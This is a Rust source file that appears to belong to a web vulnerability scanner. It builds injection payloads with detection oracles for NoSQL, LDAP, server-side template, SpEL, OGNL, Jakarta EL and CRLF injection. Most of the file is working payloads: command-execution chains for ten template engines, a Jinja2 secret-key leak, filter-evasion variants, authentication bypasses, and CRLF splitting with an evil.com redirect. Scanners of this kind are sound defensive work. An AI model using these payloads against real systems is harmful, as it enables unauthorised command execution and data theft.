use std::fmt;

// Multi-vector injection engine covering injection classes beyond SQLi.
//
// Most scanners stop at SQL injection. Real-world applications expose
// far more injection surfaces:
//
// - **NoSQL injection** — MongoDB `$gt`/`$ne`/`$where`/`$regex` operators
//   in JSON bodies; JavaScript injection via `$where`
// - **LDAP injection** — `*)(uid=*))(|(uid=*` payload patterns that break
//   out of LDAP filter parentheses
// - **SSTI** (Server-Side Template Injection) — Jinja2, Twig, Freemarker,
//   Velocity, Thymeleaf, Mako, Pug, ERB, Smarty, Handlebars
// - **Expression Language injection** — Spring SpEL `#{T(Runtime).exec()}`,
//   OGNL `%{@java.lang.Runtime@getRuntime()}`, Jakarta EL `${...}`
// - **CRLF injection** — `\r\n` in headers → response splitting → cache
//   poisoning → XSS via injected headers
//
// The engine generates payloads tagged with injection class, payload
// variant, and expected oracle signal so the fuzzer can detect success.

/// Injection class supported by the engine.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InjectionClass {
    NoSql,
    Ldap,
    Ssti,
    SpEl,
    Ognl,
    JakartaEl,
    Crlf,
}

impl fmt::Display for InjectionClass {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoSql => write!(f, "NoSQL"),
            Self::Ldap => write!(f, "LDAP"),
            Self::Ssti => write!(f, "SSTI"),
            Self::SpEl => write!(f, "SpEL"),
            Self::Ognl => write!(f, "OGNL"),
            Self::JakartaEl => write!(f, "Jakarta EL"),
            Self::Crlf => write!(f, "CRLF"),
        }
    }
}

/// Template engine variant for SSTI payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TemplateEngine {
    Jinja2,
    Twig,
    Freemarker,
    Velocity,
    Thymeleaf,
    Mako,
    Pug,
    Erb,
    Smarty,
    Handlebars,
}

impl fmt::Display for TemplateEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Jinja2 => write!(f, "Jinja2"),
            Self::Twig => write!(f, "Twig"),
            Self::Freemarker => write!(f, "FreeMarker"),
            Self::Velocity => write!(f, "Velocity"),
            Self::Thymeleaf => write!(f, "Thymeleaf"),
            Self::Mako => write!(f, "Mako"),
            Self::Pug => write!(f, "Pug"),
            Self::Erb => write!(f, "ERB"),
            Self::Smarty => write!(f, "Smarty"),
            Self::Handlebars => write!(f, "Handlebars"),
        }
    }
}

/// Oracle signal: how to detect if the injection succeeded.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum OracleSignal {
    MathResult(String),
    StringConcat(String),
    ErrorMessage(String),
    TimingDelay(u64),
    StatusCodeChange,
    BodyLengthDelta,
    HeaderPresence(String),
    ReflectedValue(String),
}

impl fmt::Display for OracleSignal {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::MathResult(v) => write!(f, "math={v}"),
            Self::StringConcat(v) => write!(f, "concat={v}"),
            Self::ErrorMessage(v) => write!(f, "error contains '{v}'"),
            Self::TimingDelay(ms) => write!(f, "delay>={ms}ms"),
            Self::StatusCodeChange => write!(f, "status code changed"),
            Self::BodyLengthDelta => write!(f, "body length changed"),
            Self::HeaderPresence(h) => write!(f, "header '{h}' present"),
            Self::ReflectedValue(v) => write!(f, "reflected '{v}'"),
        }
    }
}

/// A single injection payload ready for delivery.
#[derive(Debug, Clone)]
pub struct InjectionPayload {
    pub class: InjectionClass,
    pub variant: String,
    pub payload: String,
    pub oracle: OracleSignal,
    pub context_hint: String,
    pub evasion_level: u8,
}

/// Configuration for the injection engine.
#[derive(Debug, Clone)]
pub struct InjectionConfig {
    pub classes: Vec<InjectionClass>,
    pub include_time_based: bool,
    pub include_error_based: bool,
    pub max_evasion_level: u8,
    pub math_canary_a: u64,
    pub math_canary_b: u64,
    pub string_canary: String,
}

impl Default for InjectionConfig {
    fn default() -> Self {
        Self {
            classes: vec![
                InjectionClass::NoSql,
                InjectionClass::Ldap,
                InjectionClass::Ssti,
                InjectionClass::SpEl,
                InjectionClass::Ognl,
                InjectionClass::JakartaEl,
                InjectionClass::Crlf,
            ],
            include_time_based: true,
            include_error_based: true,
            max_evasion_level: 2,
            math_canary_a: 13379,
            math_canary_b: 7331,
            string_canary: "aegis".to_string(),
        }
    }
}

/// The injection engine generates payloads across all configured classes.
pub struct InjectionEngine {
    config: InjectionConfig,
}

impl InjectionEngine {
    pub fn new(config: InjectionConfig) -> Self {
        Self { config }
    }

    pub fn config(&self) -> &InjectionConfig {
        &self.config
    }

    /// Generate all payloads for all configured injection classes.
    pub fn generate_all(&self) -> Vec<InjectionPayload> {
        let mut payloads = Vec::new();
        for class in &self.config.classes {
            match class {
                InjectionClass::NoSql => payloads.extend(self.nosql_payloads()),
                InjectionClass::Ldap => payloads.extend(self.ldap_payloads()),
                InjectionClass::Ssti => payloads.extend(self.ssti_payloads()),
                InjectionClass::SpEl => payloads.extend(self.spel_payloads()),
                InjectionClass::Ognl => payloads.extend(self.ognl_payloads()),
                InjectionClass::JakartaEl => payloads.extend(self.jakarta_el_payloads()),
                InjectionClass::Crlf => payloads.extend(self.crlf_payloads()),
            }
        }
        payloads
    }

    /// Generate payloads for a specific injection class.
    pub fn generate_for_class(&self, class: InjectionClass) -> Vec<InjectionPayload> {
        match class {
            InjectionClass::NoSql => self.nosql_payloads(),
            InjectionClass::Ldap => self.ldap_payloads(),
            InjectionClass::Ssti => self.ssti_payloads(),
            InjectionClass::SpEl => self.spel_payloads(),
            InjectionClass::Ognl => self.ognl_payloads(),
            InjectionClass::JakartaEl => self.jakarta_el_payloads(),
            InjectionClass::Crlf => self.crlf_payloads(),
        }
    }

    /// Identify which template engine is present from a math canary probe.
    pub fn identify_template_engine(response_body: &str) -> Option<TemplateEngine> {
        let markers: Vec<(TemplateEngine, &str)> = vec![
            (TemplateEngine::Jinja2, "jinja2"),
            (TemplateEngine::Jinja2, "TemplateSyntaxError"),
            (TemplateEngine::Twig, "Twig"),
            (TemplateEngine::Twig, "twig"),
            (TemplateEngine::Freemarker, "freemarker"),
            (TemplateEngine::Freemarker, "FreeMarker"),
            (TemplateEngine::Velocity, "velocity"),
            (TemplateEngine::Velocity, "Velocity"),
            (TemplateEngine::Thymeleaf, "thymeleaf"),
            (TemplateEngine::Thymeleaf, "Thymeleaf"),
            (TemplateEngine::Mako, "mako"),
            (TemplateEngine::Mako, "Mako"),
            (TemplateEngine::Pug, "Pug"),
            (TemplateEngine::Pug, "pug"),
            (TemplateEngine::Erb, "ERB"),
            (TemplateEngine::Erb, "erb"),
            (TemplateEngine::Smarty, "Smarty"),
            (TemplateEngine::Smarty, "smarty"),
            (TemplateEngine::Handlebars, "Handlebars"),
            (TemplateEngine::Handlebars, "handlebars"),
        ];
        let lower = response_body.to_lowercase();
        for (engine, marker) in &markers {
            if lower.contains(&marker.to_lowercase()) {
                return Some(*engine);
            }
        }
        None
    }

    /// Generate targeted SSTI payloads for a specific template engine.
    pub fn ssti_for_engine(&self, engine: TemplateEngine) -> Vec<InjectionPayload> {
        let a = self.config.math_canary_a;
        let b = self.config.math_canary_b;
        let result = a * b;
        let result_str = result.to_string();

        match engine {
            TemplateEngine::Jinja2 => vec![
                make_ssti(
                    engine,
                    "rce-import",
                    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
                make_ssti(
                    engine,
                    "config-leak",
                    "{{config.items()}}",
                    OracleSignal::ReflectedValue("SECRET_KEY".into()),
                ),
                make_ssti(
                    engine,
                    "mro-walk",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    OracleSignal::BodyLengthDelta,
                ),
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("{{{{{}*{}}}}}", a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
            ],
            TemplateEngine::Twig => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("{{{{{}*{}}}}}", a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "filter-exec",
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
                make_ssti(
                    engine,
                    "system-call",
                    "{{['id']|filter('system')}}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
            ],
            TemplateEngine::Freemarker => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("${{{}*{}}}", a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "exec-new",
                    r#"<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}"#,
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
                make_ssti(
                    engine,
                    "api-builtin",
                    "${.version}",
                    OracleSignal::BodyLengthDelta,
                ),
            ],
            TemplateEngine::Velocity => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("#set($x={}*{})$x", a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "class-forname",
                    "#set($rt=$class.forName('java.lang.Runtime'))#set($obj=$rt.getMethod('getRuntime').invoke(null))$obj.exec('id')",
                    OracleSignal::BodyLengthDelta,
                ),
            ],
            TemplateEngine::Thymeleaf => vec![
                make_ssti(
                    engine,
                    "spel-inject",
                    &format!("__${{{}*{}}}__::x", a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "runtime-exec",
                    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::x",
                    OracleSignal::BodyLengthDelta,
                ),
            ],
            TemplateEngine::Mako => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("${{{{'{}*{}'.format({}*{})}}}}", a, b, a, b),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "os-import",
                    "<%import os;x=os.popen('id').read()%>${x}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
            ],
            TemplateEngine::Pug => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("#{{{a}*{b}}}"),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "rce-require",
                    "#{global.process.mainModule.require('child_process').execSync('id')}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
            ],
            TemplateEngine::Erb => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("<%= {a}*{b} %>"),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "system-exec",
                    "<%= system('id') %>",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
                make_ssti(
                    engine,
                    "backtick-exec",
                    "<%= `id` %>",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
            ],
            TemplateEngine::Smarty => vec![
                make_ssti(
                    engine,
                    "math-confirm",
                    &format!("{{{a}*{b}}}"),
                    OracleSignal::MathResult(result_str.clone()),
                ),
                make_ssti(
                    engine,
                    "php-tag",
                    "{php}echo `id`;{/php}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
                make_ssti(
                    engine,
                    "if-exec",
                    "{if system('id')}{/if}",
                    OracleSignal::ReflectedValue("uid=".into()),
                ),
            ],
            TemplateEngine::Handlebars => vec![make_ssti(
                engine,
                "lookup-proto",
                "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\" }}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}",
                OracleSignal::ReflectedValue("uid=".into()),
            )],
        }
    }

    fn nosql_payloads(&self) -> Vec<InjectionPayload> {
        let mut payloads = vec![
            make_payload(
                InjectionClass::NoSql,
                "auth-bypass-ne",
                r#"{"$ne": ""}"#,
                OracleSignal::StatusCodeChange,
                "JSON body parameter",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "auth-bypass-gt",
                r#"{"$gt": ""}"#,
                OracleSignal::StatusCodeChange,
                "JSON body parameter",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "regex-wildcard",
                r#"{"$regex": ".*"}"#,
                OracleSignal::BodyLengthDelta,
                "JSON body parameter",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "regex-extract",
                r#"{"$regex": "^a"}"#,
                OracleSignal::BodyLengthDelta,
                "JSON body boolean oracle",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "where-true",
                r#"{"$where": "1==1"}"#,
                OracleSignal::StatusCodeChange,
                "JSON body parameter",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "where-sleep",
                r#"{"$where": "sleep(5000)"}"#,
                OracleSignal::TimingDelay(5000),
                "JSON body parameter — time-based blind",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "or-array",
                r#"{"$or": [{"a": "1"}, {"b": "1"}]}"#,
                OracleSignal::StatusCodeChange,
                "JSON body root",
                0,
            ),
            make_payload(
                InjectionClass::NoSql,
                "in-operator",
                r#"{"$in": ["admin", "root"]}"#,
                OracleSignal::StatusCodeChange,
                "JSON body parameter",
                0,
            ),
            // URL-encoded variants for query strings
            make_payload(
                InjectionClass::NoSql,
                "query-ne",
                "[$ne]=",
                OracleSignal::StatusCodeChange,
                "query string parameter",
                1,
            ),
            make_payload(
                InjectionClass::NoSql,
                "query-gt",
                "[$gt]=",
                OracleSignal::StatusCodeChange,
                "query string parameter",
                1,
            ),
            make_payload(
                InjectionClass::NoSql,
                "query-regex",
                "[$regex]=.*",
                OracleSignal::BodyLengthDelta,
                "query string parameter",
                1,
            ),
            make_payload(
                InjectionClass::NoSql,
                "query-exists",
                "[$exists]=true",
                OracleSignal::StatusCodeChange,
                "query string parameter",
                1,
            ),
        ];

        if self.config.include_time_based {
            payloads.push(make_payload(
                InjectionClass::NoSql,
                "where-sleep-long",
                r#"{"$where": "sleep(10000)"}"#,
                OracleSignal::TimingDelay(10000),
                "time-based blind — longer delay for noisy networks",
                0,
            ));
        }

        payloads
    }

    fn ldap_payloads(&self) -> Vec<InjectionPayload> {
        vec![
            make_payload(
                InjectionClass::Ldap,
                "wildcard-filter",
                "*)(uid=*))(|(uid=*",
                OracleSignal::BodyLengthDelta,
                "filter parameter",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "always-true",
                "*)(&",
                OracleSignal::StatusCodeChange,
                "filter parameter",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "or-bypass",
                "*)(|(uid=*)",
                OracleSignal::StatusCodeChange,
                "OR injection",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "null-byte",
                "*)\x00",
                OracleSignal::StatusCodeChange,
                "null byte truncation",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "attr-enum",
                "*)(&(objectClass=*)",
                OracleSignal::BodyLengthDelta,
                "attribute enumeration",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "blind-bool-true",
                "admin)(|(password=*))",
                OracleSignal::StatusCodeChange,
                "blind boolean true",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "blind-bool-false",
                "admin)(|(password=NOPE_INVALID))",
                OracleSignal::StatusCodeChange,
                "blind boolean false — compare with true",
                0,
            ),
            make_payload(
                InjectionClass::Ldap,
                "unicode-bypass",
                "*%29%28%7c%28uid%3d*",
                OracleSignal::StatusCodeChange,
                "URL-encoded filter",
                1,
            ),
            make_payload(
                InjectionClass::Ldap,
                "nested-filter",
                ")(cn=*)(|(cn=*))(&(objectClass=person)",
                OracleSignal::BodyLengthDelta,
                "nested filter injection",
                1,
            ),
        ]
    }

    fn ssti_payloads(&self) -> Vec<InjectionPayload> {
        let a = self.config.math_canary_a;
        let b = self.config.math_canary_b;
        let result = (a * b).to_string();

        let mut payloads = vec![
            // Polyglot probes that trigger in multiple engines
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-jinja-twig",
                &format!("{{{{{a}*{b}}}}}"),
                OracleSignal::MathResult(result.clone()),
                "Jinja2/Twig/Nunjucks",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-freemarker",
                &format!("${{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "FreeMarker/Thymeleaf/EL",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-erb",
                &format!("<%= {a}*{b} %>"),
                OracleSignal::MathResult(result.clone()),
                "ERB/Slim",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-pug",
                &format!("#{{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "Pug/Jade",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-smarty",
                &format!("{{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "Smarty",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "polyglot-math-velocity",
                &format!("#set($x={a}*{b})$x"),
                OracleSignal::MathResult(result.clone()),
                "Velocity",
                0,
            ),
            // String concatenation probes
            make_payload(
                InjectionClass::Ssti,
                "concat-jinja",
                &format!(
                    "{{{{'{canary}'~'{canary}'}}}}",
                    canary = self.config.string_canary
                ),
                OracleSignal::StringConcat(format!("{0}{0}", self.config.string_canary)),
                "Jinja2 string concat",
                0,
            ),
            make_payload(
                InjectionClass::Ssti,
                "concat-twig",
                &format!(
                    "{{{{'{canary}'~'{canary}'}}}}",
                    canary = self.config.string_canary
                ),
                OracleSignal::StringConcat(format!("{0}{0}", self.config.string_canary)),
                "Twig string concat",
                0,
            ),
        ];

        if self.config.include_error_based {
            payloads.extend(vec![
                make_payload(
                    InjectionClass::Ssti,
                    "error-jinja",
                    "{{invalid_var_xyz}}",
                    OracleSignal::ErrorMessage("UndefinedError".into()),
                    "Jinja2 error leak",
                    0,
                ),
                make_payload(
                    InjectionClass::Ssti,
                    "error-twig",
                    "{{invalid_var_xyz}}",
                    OracleSignal::ErrorMessage("Variable".into()),
                    "Twig error leak",
                    0,
                ),
                make_payload(
                    InjectionClass::Ssti,
                    "error-freemarker",
                    "${invalid_var_xyz}",
                    OracleSignal::ErrorMessage("Expression".into()),
                    "FreeMarker error leak",
                    0,
                ),
            ]);
        }

        // Evasion variants
        if self.config.max_evasion_level >= 1 {
            payloads.push(make_payload(
                InjectionClass::Ssti, "evasion-jinja-attr",
                "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
                OracleSignal::ReflectedValue("uid=".into()),
                "Jinja2 WAF evasion via attr()", 1,
            ));
        }
        if self.config.max_evasion_level >= 2 {
            payloads.push(make_payload(
                InjectionClass::Ssti,
                "evasion-jinja-format",
                "{{'{0.__class__.__mro__[2].__subclasses__()}'.format(request)}}",
                OracleSignal::BodyLengthDelta,
                "Jinja2 format string evasion",
                2,
            ));
        }

        payloads
    }

    fn spel_payloads(&self) -> Vec<InjectionPayload> {
        let a = self.config.math_canary_a;
        let b = self.config.math_canary_b;
        let result = (a * b).to_string();

        let mut payloads = vec![
            make_payload(
                InjectionClass::SpEl,
                "math-hash",
                &format!("#{{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "SpEL expression in #{}",
                0,
            ),
            make_payload(
                InjectionClass::SpEl,
                "math-dollar",
                &format!("${{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "SpEL expression in ${}",
                0,
            ),
            make_payload(
                InjectionClass::SpEl,
                "runtime-exec",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                OracleSignal::BodyLengthDelta,
                "Runtime.exec()",
                0,
            ),
            make_payload(
                InjectionClass::SpEl,
                "class-forname",
                "#{T(java.lang.Class).forName('java.lang.Runtime').getMethod('exec',T(java.lang.String)).invoke(T(java.lang.Runtime).getRuntime(),'id')}",
                OracleSignal::BodyLengthDelta,
                "Class.forName chain",
                0,
            ),
            make_payload(
                InjectionClass::SpEl,
                "processbuilder",
                "#{new java.lang.ProcessBuilder({'id'}).start()}",
                OracleSignal::BodyLengthDelta,
                "ProcessBuilder",
                0,
            ),
            make_payload(
                InjectionClass::SpEl,
                "string-class",
                "#{T(String).class.forName('java.lang.Runtime')}",
                OracleSignal::BodyLengthDelta,
                "String bridge to Runtime",
                0,
            ),
        ];

        if self.config.max_evasion_level >= 1 {
            payloads.push(make_payload(
                InjectionClass::SpEl,
                "concat-bypass",
                "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}",
                OracleSignal::BodyLengthDelta,
                "Array-based exec to bypass string filters",
                1,
            ));
        }

        payloads
    }

    fn ognl_payloads(&self) -> Vec<InjectionPayload> {
        let a = self.config.math_canary_a;
        let b = self.config.math_canary_b;
        let result = (a * b).to_string();

        vec![
            make_payload(
                InjectionClass::Ognl,
                "math-percent",
                &format!("%{{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "OGNL math in %{}",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "math-dollar",
                &format!("${{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "OGNL math in ${}",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "runtime-exec",
                "%{@java.lang.Runtime@getRuntime().exec('id')}",
                OracleSignal::BodyLengthDelta,
                "Runtime static access",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "processbuilder",
                "%{(new java.lang.ProcessBuilder(new String[]{'id'})).start()}",
                OracleSignal::BodyLengthDelta,
                "ProcessBuilder chain",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "context-access",
                "%{#context}",
                OracleSignal::BodyLengthDelta,
                "ActionContext leak",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "member-access",
                "%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}",
                OracleSignal::BodyLengthDelta,
                "Member access override",
                0,
            ),
            make_payload(
                InjectionClass::Ognl,
                "multiline-exec",
                "%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}",
                OracleSignal::BodyLengthDelta,
                "Multi-statement OGNL",
                0,
            ),
        ]
    }

    fn jakarta_el_payloads(&self) -> Vec<InjectionPayload> {
        let a = self.config.math_canary_a;
        let b = self.config.math_canary_b;
        let result = (a * b).to_string();

        vec![
            make_payload(
                InjectionClass::JakartaEl,
                "math-confirm",
                &format!("${{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "EL expression",
                0,
            ),
            make_payload(
                InjectionClass::JakartaEl,
                "hash-math",
                &format!("#{{{a}*{b}}}"),
                OracleSignal::MathResult(result.clone()),
                "Deferred EL",
                0,
            ),
            make_payload(
                InjectionClass::JakartaEl,
                "runtime-exec",
                "${Runtime.getRuntime().exec('id')}",
                OracleSignal::BodyLengthDelta,
                "Runtime access",
                0,
            ),
            make_payload(
                InjectionClass::JakartaEl,
                "class-loader",
                "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
                OracleSignal::BodyLengthDelta,
                "Class loader chain",
                0,
            ),
            make_payload(
                InjectionClass::JakartaEl,
                "empty-string-bridge",
                "${''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance([['id']]).start()}",
                OracleSignal::BodyLengthDelta,
                "Empty string bridge",
                0,
            ),
        ]
    }

    fn crlf_payloads(&self) -> Vec<InjectionPayload> {
        let canary = &self.config.string_canary;
        vec![
            make_payload(
                InjectionClass::Crlf,
                "header-inject",
                &format!("\r\nX-Injected: {canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "raw CRLF",
                0,
            ),
            make_payload(
                InjectionClass::Crlf,
                "url-encoded",
                &format!("%0d%0aX-Injected:%20{canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "URL-encoded CRLF",
                0,
            ),
            make_payload(
                InjectionClass::Crlf,
                "double-encoded",
                &format!("%250d%250aX-Injected:%20{canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "double URL-encoded",
                1,
            ),
            make_payload(
                InjectionClass::Crlf,
                "response-split",
                &format!("\r\n\r\n<html>{canary}</html>"),
                OracleSignal::ReflectedValue(format!("<html>{canary}</html>")),
                "HTTP response splitting",
                0,
            ),
            make_payload(
                InjectionClass::Crlf,
                "set-cookie",
                &format!("\r\nSet-Cookie: {canary}=pwned"),
                OracleSignal::HeaderPresence(format!("Set-Cookie: {canary}=pwned")),
                "cookie injection",
                0,
            ),
            make_payload(
                InjectionClass::Crlf,
                "location-redirect",
                &format!("\r\nLocation: https://evil.com/{canary}"),
                OracleSignal::HeaderPresence("Location: https://evil.com/".into()),
                "redirect via CRLF",
                0,
            ),
            make_payload(
                InjectionClass::Crlf,
                "unicode-crlf",
                &format!("\u{000d}\u{000a}X-Injected: {canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "Unicode CRLF",
                1,
            ),
            make_payload(
                InjectionClass::Crlf,
                "cr-only",
                &format!("\rX-Injected: {canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "CR-only (some parsers)",
                1,
            ),
            make_payload(
                InjectionClass::Crlf,
                "lf-only",
                &format!("\nX-Injected: {canary}"),
                OracleSignal::HeaderPresence(format!("X-Injected: {canary}")),
                "LF-only (some parsers)",
                1,
            ),
            make_payload(
                InjectionClass::Crlf,
                "xss-via-split",
                &format!(
                    "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert('{canary}')</script>"
                ),
                OracleSignal::ReflectedValue(format!("<script>alert('{canary}')</script>")),
                "XSS via response splitting",
                0,
            ),
        ]
    }
}

/// Analyze a set of probe results to determine which injections succeeded.
pub fn analyze_injection_results(
    payloads: &[InjectionPayload],
    results: &[InjectionProbeResult],
) -> Vec<InjectionFinding> {
    let mut findings = Vec::new();

    for (payload, result) in payloads.iter().zip(results.iter()) {
        if !result.oracle_matched {
            continue;
        }
        let severity = match payload.class {
            InjectionClass::NoSql => match_nosql_severity(payload),
            InjectionClass::Ldap => InjectionSeverity::High,
            InjectionClass::Ssti => InjectionSeverity::Critical,
            InjectionClass::SpEl | InjectionClass::Ognl | InjectionClass::JakartaEl => {
                InjectionSeverity::Critical
            }
            InjectionClass::Crlf => match_crlf_severity(payload),
        };

        findings.push(InjectionFinding {
            class: payload.class,
            variant: payload.variant.clone(),
            severity,
            payload: payload.payload.clone(),
            oracle_evidence: result.evidence.clone(),
            endpoint: result.endpoint.clone(),
        });
    }

    findings
}

/// Result from sending an injection probe.
#[derive(Debug, Clone)]
pub struct InjectionProbeResult {
    pub oracle_matched: bool,
    pub evidence: String,
    pub endpoint: String,
    pub response_time_ms: u64,
}

/// A confirmed injection finding.
#[derive(Debug, Clone)]
pub struct InjectionFinding {
    pub class: InjectionClass,
    pub variant: String,
    pub severity: InjectionSeverity,
    pub payload: String,
    pub oracle_evidence: String,
    pub endpoint: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum InjectionSeverity {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for InjectionSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

fn make_payload(
    class: InjectionClass,
    variant: &str,
    payload: &str,
    oracle: OracleSignal,
    context: &str,
    evasion: u8,
) -> InjectionPayload {
    InjectionPayload {
        class,
        variant: variant.to_string(),
        payload: payload.to_string(),
        oracle,
        context_hint: context.to_string(),
        evasion_level: evasion,
    }
}

fn make_ssti(
    engine: TemplateEngine,
    variant: &str,
    payload: &str,
    oracle: OracleSignal,
) -> InjectionPayload {
    InjectionPayload {
        class: InjectionClass::Ssti,
        variant: format!("{engine}-{variant}"),
        payload: payload.to_string(),
        oracle,
        context_hint: format!("{engine} targeted"),
        evasion_level: 0,
    }
}

fn match_nosql_severity(payload: &InjectionPayload) -> InjectionSeverity {
    if payload.variant.contains("where") {
        InjectionSeverity::Critical
    } else if payload.variant.contains("bypass") {
        InjectionSeverity::High
    } else {
        InjectionSeverity::Medium
    }
}

fn match_crlf_severity(payload: &InjectionPayload) -> InjectionSeverity {
    if payload.variant.contains("xss") || payload.variant.contains("response-split") {
        InjectionSeverity::High
    } else if payload.variant.contains("set-cookie") || payload.variant.contains("location") {
        InjectionSeverity::Medium
    } else {
        InjectionSeverity::Low
    }
}

#[cfg(test)]
#[path = "injection_engine_test.rs"]
mod tests;
